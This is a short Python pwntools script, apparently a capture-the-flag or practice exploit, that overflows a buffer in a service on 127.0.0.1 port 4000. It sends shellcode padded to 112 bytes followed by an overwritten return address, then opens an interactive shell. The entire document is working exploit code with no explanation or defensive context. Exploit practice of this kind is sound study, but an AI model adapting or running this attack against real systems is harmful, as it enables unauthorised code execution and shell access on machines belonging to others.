from pwn import *

r = remote('127.0.0.1',4000)

shellcode = asm(shellcraft.sh())

raw_input('#')

r.sendline(shellcode.ljust(112,'A')+p32(0x804a080))
r.interactive()
